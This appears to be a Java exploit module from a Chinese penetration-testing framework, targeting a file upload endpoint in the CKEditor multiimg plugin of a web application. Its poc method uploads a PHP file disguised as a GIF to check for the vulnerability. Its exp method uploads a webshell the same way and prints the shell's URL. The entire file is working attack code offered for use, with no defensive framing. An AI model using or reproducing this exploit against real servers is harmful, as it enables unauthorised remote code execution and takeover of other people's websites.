package cn.exploit;

import cn.utils.HttpUtil;
import org.apache.http.Consts;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.mime.HttpMultipartMode;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.entity.mime.content.FileBody;

import java.io.File;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Shiziyu_image_upload_getshell extends ExploitFather {

    HttpUtil httpUtil = new HttpUtil();

    @Override
    public String poc(String url) {
        StringBuffer result = new StringBuffer("不存在漏洞");
        //设置get类型payload
        String send = url + "/Common/ckeditor/plugins/multiimg/dialogs/image_upload.php";
        httpUtil.url = send;
        //设置header头
        HashMap<String,String> headers = new HashMap<String,String>();
        headers.put("User-Agent","Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 Greatwqs");
        httpUtil.headers = headers;

        //设置上传文件
        String name = System.getProperty("user.dir")+ File.separator+"config"+File.separator+"check.php";
        File file = new File(name);
        FileBody fileBody = new FileBody(file,ContentType.IMAGE_GIF);
        MultipartEntityBuilder builder = MultipartEntityBuilder.create();
        builder.setCharset(Consts.UTF_8);
        builder.setContentType(ContentType.MULTIPART_FORM_DATA);
        builder.setMode(HttpMultipartMode.BROWSER_COMPATIBLE);//模拟游览器
        httpUtil.file_entity = builder.addPart("files",fileBody)
                .build();

        //获取返回内容
        String[] resContent = httpUtil.doPost_upload();
        if(resContent[0]!=null){
            String status_code = resContent[0];
            String text = resContent[1];
            if(status_code.equals("200")){
                if(text.contains("imgurl")){
                    result.setLength(0);
                    result.append("存在漏洞\n");
                    String pattern = "\"imgurl\":\"(.*?)\"";
                    Pattern r = Pattern.compile(pattern);
                    Matcher m = r.matcher(text);
                    if(m.find()){
                        result.append("测试文件url:"+url+"/Common/"+m.group(1));
                    }
                }
            }
        }
        return result.toString();
    }

    @Override
    public String exp(String url, String payload) {
        StringBuffer result = new StringBuffer("不存在漏洞");
        //设置get类型payload
        String send = url + "/Common/ckeditor/plugins/multiimg/dialogs/image_upload.php";
        httpUtil.url = send;
        //设置header头
        HashMap<String,String> headers = new HashMap<String,String>();
        headers.put("User-Agent","Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 Greatwqs");
        httpUtil.headers = headers;

        //设置上传文件
        String name = System.getProperty("user.dir")+ File.separator+"config"+File.separator+"shell.php";
        File file = new File(name);
        FileBody fileBody = new FileBody(file,ContentType.IMAGE_GIF);
        MultipartEntityBuilder builder = MultipartEntityBuilder.create();
        builder.setCharset(Consts.UTF_8);
        builder.setContentType(ContentType.MULTIPART_FORM_DATA);
        builder.setMode(HttpMultipartMode.BROWSER_COMPATIBLE);//模拟游览器
        httpUtil.file_entity = builder.addPart("files",fileBody)
                .build();

        //获取返回内容
        String[] resContent = httpUtil.doPost_upload();
        if(resContent[0]!=null){
            String status_code = resContent[0];
            String text = resContent[1];
            if(status_code.equals("200")){
                if(text.contains("imgurl")){
                    result.setLength(0);
                    result.append("上传webshell成功\n");
                    String pattern = "\"imgurl\":\"(.*?)\"";
                    Pattern r = Pattern.compile(pattern);
                    Matcher m = r.matcher(text);
                    if(m.find()){
                        result.append("webshell:"+url+"/Common/"+m.group(1));
                    }
                }
            }
        }
        return result.toString();
    }
}
